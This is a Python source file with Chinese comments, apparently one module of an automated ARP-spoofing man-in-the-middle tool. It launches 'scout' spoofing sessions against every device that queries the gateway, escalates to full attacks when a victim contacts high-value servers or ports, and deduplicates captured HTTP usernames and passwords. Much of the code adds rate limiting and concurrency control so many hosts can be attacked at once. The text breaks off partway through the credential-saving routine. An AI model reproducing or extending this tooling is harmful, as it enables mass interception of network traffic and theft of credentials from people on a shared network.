"""
攻击协调器 v2.0 - 高性能并发控制版
=====================================
根据数据包分析结果制定攻击策略，管理攻击生命周期
新增功能：
- 令牌桶限流机制
- Scout错峰启动
- 重复事件去重
- ARM平台优化
"""

import logging
import time
import threading
import random
import hashlib
import platform
from collections import deque
from dataclasses import dataclass
from typing import Optional, Callable, Dict, Any, Set
from queue import Queue, Full, Empty
from state_cache import StateCache
from adaptive_flow_control import AdaptiveFlowController, TaskBufferPool

@dataclass
class AttackDecision:
    """攻击决策"""
    action: str  # 'attack', 'restore', 'ignore'
    target_ip: str
    gateway_ip: str = ""
    target_mac: str = ""
    gateway_mac: str = ""
    duration: int = 45  # 攻击持续时间(秒)
    attack_type: str = "standard"  # 攻击类型
    reason: str = ""  # 决策原因

class ConcurrencyController:
    """并发控制器 - 令牌桶算法"""
    
    def __init__(self, max_concurrent=20, refill_rate=5):
        self.max_concurrent = max_concurrent  # 最大并发数
        self.refill_rate = refill_rate        # 每秒补充令牌数
        self.tokens = max_concurrent          # 当前令牌数
        self.last_refill = time.time()
        self.lock = threading.Lock()
        
    def acquire_token(self) -> bool:
        """获取令牌（非阻塞）"""
        with self.lock:
            self._refill_tokens()
            if self.tokens > 0:
                self.tokens -= 1
                return True
            return False
    
    def release_token(self):
        """释放令牌"""
        with self.lock:
            self.tokens = min(self.max_concurrent, self.tokens + 1)
    
    def _refill_tokens(self):
        """补充令牌"""
        now = time.time()
        elapsed = now - self.last_refill
        tokens_to_add = int(elapsed * self.refill_rate)
        
        if tokens_to_add > 0:
            self.tokens = min(self.max_concurrent, self.tokens + tokens_to_add)
            self.last_refill = now
    
    def get_status(self) -> dict:
        """获取状态信息"""
        with self.lock:
            return {
                'tokens': self.tokens,
                'max_concurrent': self.max_concurrent,
                'refill_rate': self.refill_rate
            }

class ScoutLauncher:
    """Scout任务启动器 - 错峰 + 限流 + 缓冲池版本"""
    
    def __init__(self, max_concurrent=50, launch_rate=8, logger=None):
        self.max_concurrent = max_concurrent  # 最大Scout数量
        self.launch_rate = launch_rate        # 每秒启动Scout数
        self.logger = logger or logging.getLogger(__name__)
        
        # ★【第一步】★ 建立任务缓冲池 - 替代原有的简单队列
        self.scout_task_buffer = TaskBufferPool(
            maxsize=100,  # 最多缓冲100个Scout任务
            name="ScoutTaskBuffer"
        )
        
        # 令牌桶控制
        self.semaphore = threading.Semaphore(max_concurrent)
        self.active_scouts = set()
        self.lock = threading.Lock()
        
        # ★【第二步】★ 启动任务执行线程（从缓冲池获取任务）
        self.executor_running = True
        self.executor_thread = threading.Thread(
            target=self._execute_tasks_from_buffer, 
            daemon=True, 
            name="ScoutTaskExecutor"
        )
        self.executor_thread.start()
        
        self.command_sender = None
        
        self.logger.info(f"🚀 ScoutLauncher initialized with buffer pool (capacity: 100)")
        
    def set_command_sender(self, sender):
        """设置命令发送器"""
        self.command_sender = sender
    
    def schedule_scout(self, target_ip, gateway_ip="10.17.0.1") -> bool:
        """调度一个Scout任务 - 使用缓冲池版本"""
        with self.lock:
            if target_ip not in self.active_scouts and len(self.active_scouts) < self.max_concurrent:
                # ★【第二步核心】★ 创建任务并尝试放入缓冲池（弃老保新）
                scout_task = {
                    'target_ip': target_ip,
                    'gateway_ip': gateway_ip,
                    'created_time': time.time(),  # 任务创建时间
                    'priority': 'normal'
                }
                
                # 使用缓冲池的"弃老保新"策略
                if self.scout_task_buffer.put_task(scout_task):
                    self.logger.debug(f"📋 Scout task for {target_ip} added to buffer pool")
                    return True
                else:
                    self.logger.warning(f"⚠️ Failed to add Scout task for {target_ip} to buffer pool")
                    return False
        return False
    
    def _execute_tasks_from_buffer(self):
        """★【第二步核心】★ 从缓冲池循环获取并执行任务"""
        self.logger.info("🔄 Scout task executor started - monitoring buffer pool")
        
        while self.executor_running:
            try:
                # 从缓冲池获取任务（阻塞1秒）
                task = self.scout_task_buffer.get_task(timeout=1.0)
                
                if task is None:
                    continue  # 超时，继续循环
                
                # 检查任务是否过期（防止处理过时任务）
                task_age = time.time() - task['created_time']
                if task_age > 60:  # 任务超过60秒视为过期
                    self.logger.debug(f"⏰ Discarded expired Scout task for {task['target_ip']} (age: {task_age:.1f}s)")
                    continue
                
                # 尝试获取信号量（非阻塞）
                if self.semaphore.acquire(blocking=False):
                    try:
                        self._launch_scout_immediate(task)
                        # 控制启动速率
                        time.sleep(1.0 / self.launch_rate)
                    except Exception as e:
                        self.logger.error(f"Error launching scout for {task['target_ip']}: {e}")
                        self.semaphore.release()
                else:
                    # 信号量满了，将任务重新放回缓冲池（优先级降低）
                    task['priority'] = 'deferred'
                    task['created_time'] = time.time()  # 更新时间戳
                    self.scout_task_buffer.put_task(task)
                    time.sleep(0.5)  # 等待一段时间再重试
                
            except Exception as e:
                self.logger.error(f"Error in scout task executor: {e}")
                time.sleep(1)
        
        self.logger.info("🛑 Scout task executor stopped")
    
    def _launch_scout_immediate(self, scout_task):
        """立即启动Scout"""
        try:
            target_ip = scout_task['target_ip']
            
            with self.lock:
                self.active_scouts.add(target_ip)
            
            # 构造Scout命令
            command = {
                "type": "START_SPOOF",
                "target_ip": target_ip,
                "gateway_ip": scout_task['gateway_ip'],
                "attack_type": "scouting",
                "duration": 60
            }
            
            # 发送给队列处理
            if self.command_sender:
                self.command_sender(command)
                self.logger.info(f"🚀 Scout launched for {target_ip} (Active: {len(self.active_scouts)}/{self.max_concurrent})")
            
            # 60秒后释放信号量
            threading.Timer(60.0, self._release_scout, args=[target_ip]).start()
            
        except Exception as e:
            self.logger.error(f"Error launching scout: {e}")
            self.semaphore.release()
    
    def _release_scout(self, target_ip):
        """释放Scout资源"""
        with self.lock:
            self.active_scouts.discard(target_ip)
        self.semaphore.release()
        self.logger.debug(f"🏁 Scout released for {target_ip}")
    
    def get_status(self) -> dict:
        """获取状态信息 - 缓冲池版本"""
        with self.lock:
            buffer_stats = self.scout_task_buffer.get_stats()
            return {
                'active_count': len(self.active_scouts),
                'max_concurrent': self.max_concurrent,
                'launch_rate': self.launch_rate,
                'buffer_pool': buffer_stats,
                'utilization': len(self.active_scouts) / self.max_concurrent * 100
            }
    
    def shutdown(self):
        """优雅关闭Scout启动器"""
        self.executor_running = False
        if hasattr(self, 'executor_thread') and self.executor_thread.is_alive():
            self.executor_thread.join(timeout=5)
        self.logger.info("🛑 ScoutLauncher shut down")

class AttackCoordinator:
    """攻击协调器 v2.0 - 高性能并发控制版 + 自适应流量控制"""
    
    def __init__(self, config, state_cache: StateCache):
        self.config = config
        self.state_cache = state_cache
        self.logger = logging.getLogger(__name__)
        self.command_sender = None
        
        # ★【配置化改进】★ 从配置文件读取并发控制参数
        self._load_concurrency_config()
        
        # ★【新增：自适应流量控制器】★ 实现智能前端限流和后端缓冲
        self.adaptive_flow_controller = AdaptiveFlowController(
            initial_rate=50.0,  # 从配置文件读取
            buffer_size=100,    # Scout任务缓冲池大小
            name="AttackCoordinator"
        )
        
        # ★【方案一】★ 并发控制器 - 令牌桶限流
        self.concurrency_controller = ConcurrencyController(
            max_concurrent=self.attack_max,
            refill_rate=self.attack_refill_rate
        )
        
        # ★【方案二增强】★ Scout发射器 - 错峰启动 + 缓冲池
        self.scout_launcher = ScoutLauncher(
            max_concurrent=self.scout_max,
            launch_rate=self.scout_launch_rate,
            logger=self.logger
        )
        
        # ★【方案三】★ 重复事件去重缓存
        self.processing_targets = {}  # TTL cache替代
        self.processing_lock = threading.Lock()
        self.processing_ttl = self.event_dedup_ttl
        
        # 命令去重缓存
        self.command_fingerprints = {}
        self.command_lock = threading.Lock()
        self.command_ttl = self.command_dedup_ttl
        
        # ★【延迟队列】★ 用于缓存暂时无法执行的攻击
        self.delayed_attacks = deque()
        self.delay_processor_thread = None
        self.delay_processor_running = False
        
        # ★【关键修复】★ Scout和Attack分离的并发限制（保持兼容性）
        self.max_scout_attacks = self.scout_max
        self.max_active_attacks = self.attack_max
        self.max_concurrent_attacks = self.attack_max  # 向后兼容
        
        # ★【分离管理】★ 独立跟踪Scout和Attack会话
        self.active_scouts_lock = threading.Lock()
        self.active_attacks_lock = threading.Lock()
        self.active_scouts: Set[str] = set()
        self.active_attacks: Set[str] = set()
        
        # ★【强化去重】★ 全局凭据处理去重锁和缓存
        self._global_credentials_lock = threading.RLock()
        self._processing_credentials: Set[str] = set()
        self._processed_credentials: Set[str] = set()
        self._last_cleanup = time.time()  # 上次清理时间
        
        # ★【新增】★ ARP 恢复去重
        self._arp_restore_lock = threading.Lock()
        self._restoring_targets: Set[str] = set()  # 正在恢复的目标集合
        
        # ★【新增】★ 决策去重机制 - 避免多线程重复决策
        self._decision_lock = threading.Lock()
        self._processing_decisions: Set[str] = set()  # 正在处理的决策集合 (format: "action:target_ip")
        
        # 统计信息
        self.stats = {
            'decisions_made': 0,
            'scouts_authorized': 0,           # ★【新增】★ Scout授权统计
            'attacks_authorized': 0,          # Attack授权统计
            'scouts_blocked': 0,              # ★【新增】★ Scout阻止统计
            'attacks_blocked': 0,             # Attack阻止统计
            'scout_to_attack_upgrades': 0,    # ★【新增】★ Scout升级为Attack统计
            'restores_initiated': 0,
            'credentials_deduplicated': 0,    # 去重统计
            'arp_restore_deduplicated': 0,    # ARP恢复去重统计
            'decisions_deduplicated': 0       # 决策去重统计
        }
        self.stats_lock = threading.Lock()
        
    def initialize(self, command_sender: Callable) -> bool:
        """初始化协调器 v2.0"""
        self.command_sender = command_sender
        
        # ★【新增】★ 设置Scout发射器的命令发送器
        self.scout_launcher.set_command_sender(command_sender)
        
        # ★【新增】★ 启动延迟攻击处理线程
        self._start_delay_processor()
        
        # ★【新增】★ 启动定期清理线程
        self._start_cleanup_thread()
        
        # ★【新增】★ 启动自适应任务处理器线程
        self._start_adaptive_task_processor()
        
        self.logger.info("🚀 Attack Coordinator v2.0 initialized with enhanced concurrency control")
        return True

    def _start_delay_processor(self):
        """启动延迟攻击处理线程"""
        self.delay_processor_running = True
        self.delay_processor_thread = threading.Thread(
            target=self._delay_processor_loop,
            daemon=True,
            name="DelayProcessor"
        )
        self.delay_processor_thread.start()
        self.logger.info("🕒 Delay processor started")

    def _delay_processor_loop(self):
        """延迟攻击处理循环"""
        while self.delay_processor_running:
            try:
                if self.delayed_attacks and self.concurrency_controller.acquire_token():
                    delayed_decision = self.delayed_attacks.popleft()
                    
                    # 发送延迟的攻击命令
                    if self.command_sender:
                        command = self._decision_to_command(delayed_decision)
                        self.command_sender(command)
                        self.logger.info(f"🚀 Delayed attack launched for {delayed_decision.target_ip}")
                
                time.sleep(0.2)  # 每200ms检查一次
                
            except Exception as e:
                self.logger.error(f"Error in delay processor: {e}")
                time.sleep(1)

    def _decision_to_command(self, decision) -> dict:
        """将决策转换为命令"""
        return {
            "type": "START_SPOOF",
            "target_ip": decision.target_ip,
            "gateway_ip": decision.gateway_ip,
            "attack_type": decision.attack_type,
            "duration": decision.duration
        }
    
    def _start_cleanup_thread(self):
        """启动定期清理线程，防止内存泄漏"""
        def cleanup_worker():
            while True:
                try:
                    time.sleep(30)  # ★【优化】★ 改为每30秒清理一次，更及时
                    
                    current_time = time.time()
                    
                    # ★【新增】★ 清理过期的Scout和Attack会话
                    self.cleanup_expired_sessions()
                    
                    # 清理决策处理集合
                    with self._decision_lock:
                        # 简单粗暴的定期清空，因为决策处理通常很快
                        if len(self._processing_decisions) > 100:  # 如果积累太多可能是有问题
                            self._processing_decisions.clear()
                            self.logger.info("🧹 Cleared decision processing cache")
                    
                    # 清理已处理凭据集合
                    with self._global_credentials_lock:
                        if current_time - self._last_cleanup > 300:  # 5分钟清理一次
                            self._processed_credentials.clear()
                            self._last_cleanup = current_time
                            self.logger.debug("🧹 Cleared processed credentials cache")
                    
                    # 清理ARP恢复集合（这个应该自动清理，但防止内存泄漏）
                    with self._arp_restore_lock:
                        if len(self._restoring_targets) > 50:  # 如果积累太多
                            self._restoring_targets.clear()
                            self.logger.info("🧹 Cleared ARP restore tracking cache")
                    
                    # ★【新增】★ 每5分钟输出会话统计和并发状态
                    if not hasattr(self, '_last_stats_log') or current_time - self._last_stats_log > 300:
                        stats = self.get_session_stats()
                        self.logger.info(f"📊 Session Stats: Scout {stats['active_scouts']}/{stats['max_scout_attacks']} ({stats['scout_utilization']:.1f}%), Attack {stats['active_attacks']}/{stats['max_active_attacks']} ({stats['attack_utilization']:.1f}%)")
                        
                        # ★【新增】★ 输出并发状态，便于监控竞争条件
                        self.log_concurrency_status()
                        
                        # ★【强化监控】★ 输出去重机制状态
                        self.log_deduplication_status()
                        
                        self._last_stats_log = current_time
                    
                except Exception as e:
                    self.logger.error(f"Cleanup thread error: {e}")
        
        cleanup_thread = threading.Thread(target=cleanup_worker, daemon=True, name="CoordinatorCleanup")
        cleanup_thread.start()
        self.logger.info("🧹 Started coordinator cleanup thread with session management")
        
        return True

    def _start_adaptive_task_processor(self):
        """★【第二步核心】★ 启动自适应任务处理器线程"""
        def task_processor():
            """从自适应流量控制器的缓冲池处理任务"""
            self.logger.info("🔄 Adaptive task processor started")
            
            while self.delay_processor_running:  # 复用现有的运行标志
                try:
                    # 从自适应缓冲池获取任务
                    task = self.adaptive_flow_controller.get_task(timeout=1.0)
                    
                    if task is None:
                        continue  # 超时，继续循环
                    
                    # 检查任务是否过期
                    task_age = time.time() - task['created_time']
                    if task_age > 60:  # 任务超过60秒视为过期
                        self.logger.debug(f"⏰ Discarded expired adaptive task for {task['target_ip']} (age: {task_age:.1f}s)")
                        continue
                    
                    # 使用Scout发射器处理任务
                    target_ip = task['target_ip']
                    gateway_ip = task['gateway_ip']
                    
                    if self.scout_launcher.schedule_scout(target_ip, gateway_ip):
                        self.logger.debug(f"✅ Adaptive task for {target_ip} processed via Scout launcher")
                    else:
                        # Scout launcher也满了，尝试直接攻击
                        if self.concurrency_controller.acquire_token():
                            # 发送直接攻击命令
                            if self.command_sender:
                                command = {
                                    'type': 'START_SPOOF',
                                    'target_ip': target_ip,
                                    'gateway_ip': gateway_ip,
                                    'attack_type': 'direct',
                                    'duration': 60
                                }
                                self.command_sender(command)
                                self.logger.info(f"🎯 Adaptive task for {target_ip} processed as direct attack")
                        else:
                            # 所有通道都满了，将任务重新放回缓冲池（降级优先级）
                            task['priority'] = 'deferred'
                            task['created_time'] = time.time()
                            if not self.adaptive_flow_controller.submit_task(task):
                                self.logger.warning(f"⚠️ Failed to requeue adaptive task for {target_ip}")
                
                except Exception as e:
                    self.logger.error(f"Error in adaptive task processor: {e}")
                    time.sleep(1)
            
            self.logger.info("🛑 Adaptive task processor stopped")
        
        # 启动线程
        adaptive_processor_thread = threading.Thread(
            target=task_processor,
            daemon=True,
            name="AdaptiveTaskProcessor"
        )
        adaptive_processor_thread.start()
        self.logger.info("🚀 Started adaptive task processor thread")

    def make_decision(self, analysis_result) -> Optional[AttackDecision]:
        """根据分析结果制定攻击决策 v3.0 - 自适应流量控制 + 强化去重版"""
        try:
            target_ip = analysis_result.src_ip if hasattr(analysis_result, 'src_ip') else analysis_result.source_ip
            
            # ★【第三步：前端智能阀门】★ 基于后端压力的自适应流量控制
            if not self.adaptive_flow_controller.should_process_packet():
                with self.stats_lock:
                    self.stats['decisions_rate_limited'] = self.stats.get('decisions_rate_limited', 0) + 1
                self.logger.debug(f"🚫 Decision rate-limited for {target_ip} due to downstream pressure")
                return None  # 被前端流量控制丢弃
            
            # ★【第二道防线：强化IP去重】★ 检查是否正在处理中（防止脉冲式攻击）
            if not self._check_and_mark_processing(target_ip):
                # 注意：这里不需要统计，因为_check_and_mark_processing内部已经统计了
                return None  # 已在处理，触发去重保护
            
            try:
                # 检查是否需要攻击
                if not self._should_attack(target_ip, analysis_result):
                    return None
                
                # ★【第二步增强】★ 智能任务调度 - 优先使用自适应缓冲池
                gateway_ip = getattr(analysis_result, 'gateway_ip', None) or "10.17.0.1"
                
                # 创建Scout任务
                scout_task = {
                    'target_ip': target_ip,
                    'gateway_ip': gateway_ip,
                    'analysis_result': analysis_result,
                    'created_time': time.time(),
                    'priority': 'normal'
                }
                
                # ★【第二步核心】★ 使用自适应流量控制器的缓冲池（弃老保新）
                if self.adaptive_flow_controller.submit_task(scout_task):
                    self.logger.info(f"🎫 Scout task for {target_ip} submitted to adaptive buffer")
                    with self.stats_lock:
                        self.stats['scouts_authorized'] += 1
                    return None  # 任务已提交到缓冲池，异步处理
                else:
                    # 缓冲池满了，记录并继续尝试fallback
                    self.logger.debug(f"Adaptive buffer submission failed for {target_ip}, trying fallback")
                    
                    # Fallback 1: 尝试直接使用Scout发射器
                    if self.scout_launcher.schedule_scout(target_ip, gateway_ip):
                        self.logger.info(f"� Scout scheduled via fallback for {target_ip}")
                        with self.stats_lock:
                            self.stats['scouts_authorized'] += 1
                        return None
                    else:
                        # Fallback 2: 尝试直接攻击
                        if self.concurrency_controller.acquire_token():
                            decision = AttackDecision(
                                action="attack",
                                target_ip=target_ip,
                                gateway_ip=gateway_ip,
                                attack_type="direct",
                                duration=60
                            )
                            self.logger.info(f"🎯 Direct attack authorized for {target_ip} (all buffers full)")
                            with self.stats_lock:
                                self.stats['attacks_authorized'] += 1
                            return decision
                        else:
                            # 所有通道都满了，记录并丢弃
                            with self.stats_lock:
                                self.stats['decisions_fully_blocked'] = self.stats.get('decisions_fully_blocked', 0) + 1
                            self.logger.warning(f"🚫 All processing channels full, dropping decision for {target_ip}")
                            return None
                        
            finally:
                # ★【重要】★ 处理完成，移除标记（无论成功还是失败）
                self._unmark_processing(target_ip)
                
        except Exception as e:
            self.logger.error(f"Error in make_decision: {e}")
            # ★【容错处理】★ 发生异常时也要清理处理标记
            try:
                self._unmark_processing(target_ip)
            except:
                pass  # 忽略清理过程中的异常
            return None

    def _check_and_mark_processing(self, target_ip: str) -> bool:
        """检查并标记目标为处理中 - 强化版本
        
        ★【第二道防线】★ 增强的IP去重机制，防止脉冲式ARP攻击
        """
        current_time = time.time()
        
        with self.processing_lock:
            # ★【性能优化】★ 批量清理过期条目，减少锁持有时间
            expired_keys = [k for k, v in self.processing_targets.items() 
                          if current_time - v > self.processing_ttl]
            
            if expired_keys:
                for key in expired_keys:
                    del self.processing_targets[key]
                self.logger.debug(f"🧹 Cleaned {len(expired_keys)} expired processing targets")
            
            # ★【强化检查】★ 检查是否已在处理中
            if target_ip in self.processing_targets:
                last_process_time = self.processing_targets[target_ip]
                time_since_last = current_time - last_process_time
                
                # ★【统计增强】★ 记录去重统计
                with self.stats_lock:
                    self.stats['ip_dedup_blocks'] = self.stats.get('ip_dedup_blocks', 0) + 1
                
                self.logger.debug(f"🚫 IP {target_ip} already being processed (last: {time_since_last:.1f}s ago, TTL: {self.processing_ttl}s)")
                return False  # 已在处理，触发去重保护
            
            # ★【强化标记】★ 标记为处理中，使用当前时间戳
            self.processing_targets[target_ip] = current_time
            
            # ★【监控告警】★ 如果处理目标数量过多，发出告警
            if len(self.processing_targets) > 200:  # 阈值可配置
                self.logger.warning(f"⚠️ High number of processing targets: {len(self.processing_targets)}, possible flood attack")
                
                # ★【自我保护】★ 清理最老的50%条目，防止内存耗尽
                if len(self.processing_targets) > 300:  # 紧急阈值
                    sorted_targets = sorted(self.processing_targets.items(), key=lambda x: x[1])
                    to_remove = len(sorted_targets) // 2
                    for target, _ in sorted_targets[:to_remove]:
                        del self.processing_targets[target]
                    self.logger.warning(f"🚨 Emergency cleanup: removed {to_remove} oldest processing targets")
            
            return True

    def _unmark_processing(self, target_ip: str):
        """移除处理标记 - 强化版本"""
        try:
            with self.processing_lock:
                if target_ip in self.processing_targets:
                    processing_duration = time.time() - self.processing_targets[target_ip]
                    del self.processing_targets[target_ip]
                    
                    # ★【性能监控】★ 记录处理时间，便于优化
                    if processing_duration > 1.0:  # 处理时间超过1秒的记录为慢请求
                        self.logger.debug(f"⏱️ Slow processing for {target_ip}: {processing_duration:.2f}s")
                        
                    with self.stats_lock:
                        self.stats['targets_unprocessed'] = self.stats.get('targets_unprocessed', 0) + 1
                else:
                    # 目标不在处理列表中，可能已经被清理了
                    self.logger.debug(f"🤔 Target {target_ip} not found in processing list during unmark")
        except Exception as e:
            self.logger.warning(f"Error unmarking processing for {target_ip}: {e}")

    def _generate_command_fingerprint(self, command: dict) -> str:
        """生成命令指纹用于去重"""
        key_fields = [
            command.get('type', ''),
            command.get('target_ip', ''),
            command.get('attack_type', '')
        ]
        return hashlib.md5('|'.join(key_fields).encode()).hexdigest()

    def send_command_with_dedup(self, command: dict) -> bool:
        """发送命令前进行去重检查"""
        fingerprint = self._generate_command_fingerprint(command)
        current_time = time.time()
        
        with self.command_lock:
            # 清理过期指纹
            expired_keys = [k for k, v in self.command_fingerprints.items() 
                          if current_time - v > self.command_ttl]
            for key in expired_keys:
                del self.command_fingerprints[key]
            
            if fingerprint in self.command_fingerprints:
                self.logger.debug(f"Duplicate command filtered: {command['type']} -> {command.get('target_ip')}")
                return False
            
            self.command_fingerprints[fingerprint] = current_time
        
        # 发送到队列
        if self.command_sender:
            self.command_sender(command)
        return True
    
    def _handle_arp_analysis(self, analysis) -> Optional[AttackDecision]:
        """处理ARP分析结果 - 发起侦察窗口 (Scout模式)"""
        if not analysis.gateway_query:
            return None
            
        target_ip = analysis.source_ip
        
        # ★【分离管理1】★ 检查Scout并发限制
        with self.active_scouts_lock:
            if len(self.active_scouts) >= self.max_scout_attacks:
                with self.stats_lock:
                    self.stats['scouts_blocked'] += 1
                self.logger.debug(f"Scout blocked for {target_ip} (max scout limit {self.max_scout_attacks} reached)")
                return AttackDecision(
                    action='ignore',
                    target_ip=target_ip,
                    reason='scout_limit_reached'
                )
        
        # 检查是否应该攻击此目标
        if not self.state_cache.should_attack_target(target_ip):
            with self.stats_lock:
                self.stats['scouts_blocked'] += 1
                
            self.logger.debug(f"Scout blocked for {target_ip} (cache hit or active session)")
            return AttackDecision(
                action='ignore',
                target_ip=target_ip,
                reason='blocked_by_cache'
            )
        
        # ★【分离管理2】★ 注册Scout会话
        with self.active_scouts_lock:
            self.active_scouts.add(target_ip)
        
        # ★【核心修改】★ 启动侦察窗口，而非全面攻击
        with self.stats_lock:
            self.stats['scouts_authorized'] += 1
            
        # 获取目标MAC (从缓存或分析结果)
        target_mac = analysis.metadata.get('src_mac', '')
        if not target_mac:
            target_mac = self.state_cache.get_cached_mac(target_ip) or ''
        
        # ★【新策略】★ 创建侦察模式的攻击决策
        decision = AttackDecision(
            action='attack',
            target_ip=target_ip,
            gateway_ip=self.config.network.gateway_ip,
            target_mac=target_mac,
            gateway_mac="",  # 将在执行时获取
            duration=self.config.attack.strategy.scouting_duration,  # 使用侦察持续时间
            attack_type='scouting',  # 侦察模式
            reason='arp_gateway_query_for_scouting'
        )
        
        # 开始侦察会话跟踪
        self.state_cache.start_attack_session(
            target_ip, 
            decision.duration, 
            decision.attack_type
        )
        
        self.logger.info(f"🔍 New device {target_ip} detected. Initiating {decision.duration}s 'scouting' MiTM (Scout {len(self.active_scouts)}/{self.max_scout_attacks}).")
        return decision
    
    def _handle_http_analysis(self, analysis) -> Optional[AttackDecision]:
        """处理HTTP分析结果 - 价值判断与攻击升级"""
        target_ip = analysis.source_ip
        
        # 获取目标和端口信息
        dst_ip = analysis.metadata.get('dst_ip', '')
        dst_port = analysis.metadata.get('dst_port', 0)
        
        # ★【核心逻辑1】★ 检查是否为高价值事件
        is_high_value_event = self._is_high_value_event(dst_ip, dst_port)
        
        # ★【核心逻辑2】★ 获取当前攻击状态
        current_attack_info = self.state_cache.get_attack_info(target_ip)
        
        # ★【核心逻辑3】★ 如果处于侦察模式，且触发高价值事件，则升级攻击
        if (is_high_value_event and 
            current_attack_info and 
            current_attack_info['attack_type'] == 'scouting' and 
            self.config.attack.strategy.auto_upgrade_on_high_value):
            
            # ★【分离管理3】★ 检查Attack并发限制
            with self.active_attacks_lock:
                if len(self.active_attacks) >= self.max_active_attacks:
                    with self.stats_lock:
                        self.stats['attacks_blocked'] += 1
                    self.logger.warning(f"Cannot upgrade {target_ip} to Attack: max attack limit {self.max_active_attacks} reached")
                    return AttackDecision(
                        action='ignore',
                        target_ip=target_ip,
                        reason='attack_limit_reached'
                    )
                
                # 注册Attack会话
                self.active_attacks.add(target_ip)
            
            # ★【分离管理4】★ 从Scout列表移除，避免重复计数
            with self.active_scouts_lock:
                self.active_scouts.discard(target_ip)
            
            with self.stats_lock:
                self.stats['scout_to_attack_upgrades'] += 1
            
            self.logger.info(f"🎯 High-value event from {target_ip} (port {dst_port})! Upgrading to full attack for {self.config.attack.strategy.full_attack_duration}s (Attack {len(self.active_attacks)}/{self.max_active_attacks}).")
            
            # 升级攻击会话
            self.state_cache.upgrade_attack_session(
                target_ip, 
                self.config.attack.strategy.full_attack_duration, 
                'full_attack'
            )
            
            # 发送攻击升级指令
            return AttackDecision(
                action='attack',
                target_ip=target_ip,
                gateway_ip=self.config.network.gateway_ip,
                duration=self.config.attack.strategy.full_attack_duration,
                attack_type='full_attack',
                reason='high_value_event_detected'
            )
        
        # ★【核心逻辑4】★ 凭据捕获处理已移到 process_high_value_event_atomic 方法
        # ★【重要修改】★ 移除凭据处理逻辑，避免重复处理
        if analysis.http_credentials:
            # 凭据处理已经在 process_high_value_event_atomic 中处理
            # 这里只返回 ignore，避免重复决策
            return AttackDecision(
                action='ignore',
                target_ip=target_ip,
                reason='credentials_handled_atomically'
            )
        
        # ★【核心逻辑5】★ 普通HTTP流量，记录但不做决策
        return AttackDecision(
            action='ignore',
            target_ip=target_ip,
            reason='http_traffic_logged'
        )
    
    def _is_high_value_event(self, dst_ip: str, dst_port: int) -> bool:
        """判断是否为高价值事件"""
        # 检查是否访问目标服务器
        if dst_ip == self.config.network.target_server:
            self.logger.debug(f"High-value server access detected: {dst_ip}")
            return True
        
        # 检查是否访问高价值端口
        if dst_port in self.config.attack.strategy.high_value_ports:
            self.logger.debug(f"High-value port access detected: {dst_port}")
            return True
        
        # ★【扩展】★ 检查其他高价值模式
        # 例如：特定域名、特定URL路径等
        # 这里可以根据实际需求扩展
            
        return False
    
    def _cleanup_session_tracking(self, target_ip: str):
        """清理会话跟踪信息"""
        # 从Scout列表移除
        with self.active_scouts_lock:
            self.active_scouts.discard(target_ip)
        
        # 从Attack列表移除
        with self.active_attacks_lock:
            self.active_attacks.discard(target_ip)
    
    def cleanup_expired_sessions(self):
        """定期清理过期会话 - 新增方法"""
        current_time = time.time()
        expired_scouts = []
        expired_attacks = []
        
        # 检查Scout会话
        with self.active_scouts_lock:
            for target_ip in list(self.active_scouts):
                attack_info = self.state_cache.get_attack_info(target_ip)
                if not attack_info or attack_info.get('expired', False):
                    expired_scouts.append(target_ip)
        
        # 检查Attack会话
        with self.active_attacks_lock:
            for target_ip in list(self.active_attacks):
                attack_info = self.state_cache.get_attack_info(target_ip)
                if not attack_info or attack_info.get('expired', False):
                    expired_attacks.append(target_ip)
        
        # 清理过期的Scout会话
        if expired_scouts:
            with self.active_scouts_lock:
                for target_ip in expired_scouts:
                    self.active_scouts.discard(target_ip)
            self.logger.info(f"🧹 Cleaned {len(expired_scouts)} expired Scout sessions")
        
        # 清理过期的Attack会话
        if expired_attacks:
            with self.active_attacks_lock:
                for target_ip in expired_attacks:
                    self.active_attacks.discard(target_ip)
            self.logger.info(f"🧹 Cleaned {len(expired_attacks)} expired Attack sessions")
    
    def get_session_stats(self) -> Dict[str, int]:
        """获取会话统计信息"""
        with self.active_scouts_lock, self.active_attacks_lock:
            return {
                'active_scouts': len(self.active_scouts),
                'active_attacks': len(self.active_attacks),
                'max_scout_attacks': self.max_scout_attacks,
                'max_active_attacks': self.max_active_attacks,
                'scout_utilization': len(self.active_scouts) / self.max_scout_attacks * 100,
                'attack_utilization': len(self.active_attacks) / self.max_active_attacks * 100
            }
    
    def _safe_stats_get(self, key: str, default=0):
        """安全地获取统计值，避免KeyError"""
        try:
            with self.stats_lock:
                return self.stats.get(key, default)
        except Exception as e:
            self.logger.warning(f"Error accessing stats key '{key}': {e}")
            return default
    
    def _safe_stats_increment(self, key: str, increment=1):
        """安全地增加统计值，避免KeyError"""
        try:
            with self.stats_lock:
                if key not in self.stats:
                    self.stats[key] = 0
                self.stats[key] += increment
        except Exception as e:
            self.logger.warning(f"Error incrementing stats key '{key}': {e}")
    
    def _safe_stats_set(self, key: str, value):
        """安全地设置统计值，避免KeyError"""
        try:
            with self.stats_lock:
                self.stats[key] = value
        except Exception as e:
            self.logger.warning(f"Error setting stats key '{key}': {e}")
    
    def _save_credentials(self, source_ip: str, credentials: Dict[str, str], metadata: Dict):
        """保存捕获的凭据并触发立即撤离 - 真正原子性版本
        
        ★【关键修复】★ 实现真正的"检查-并-设置"原子操作，彻底消除多线程竞争条件
        """
        username = credentials.get('username', '')
        password = credentials.get('password', '')
        credential_key = f"{source_ip}:{username}:{password}"
        
        # ★【原子性核心】★ 单一锁保护整个"检查-并-设置"操作
        with self._global_credentials_lock:
            # 定期清理已处理集合，避免内存泄漏
            current_time = time.time()
            if current_time - self._last_cleanup > 300:  # 5分钟清理一次
                self._processed_credentials.clear()
                self._last_cleanup = current_time
                self.logger.debug("🧹 Cleared processed credentials cache")
            
            # ★【原子检查1】★ 检查是否已经处理过
            if credential_key in self._processed_credentials:
                with self.stats_lock:
                    self.stats['credentials_deduplicated'] += 1
                self.logger.debug(f"🚫 Credentials {credential_key} already processed globally, skipping")
                return
            
            # ★【原子检查2】★ 检查是否正在处理中
            if credential_key in self._processing_credentials:
                with self.stats_lock:
                    self.stats['credentials_deduplicated'] += 1
                self.logger.debug(f"🚫 Credentials {credential_key} currently being processed, skipping")
                return
            
            # ★【原子检查3】★ 状态缓存检查
            if self.state_cache.has_credentials_saved(credential_key):
                with self.stats_lock:
                    self.stats['credentials_deduplicated'] += 1
                self.logger.debug(f"🚫 Credentials {credential_key} already in state cache, skipping")
                return
            
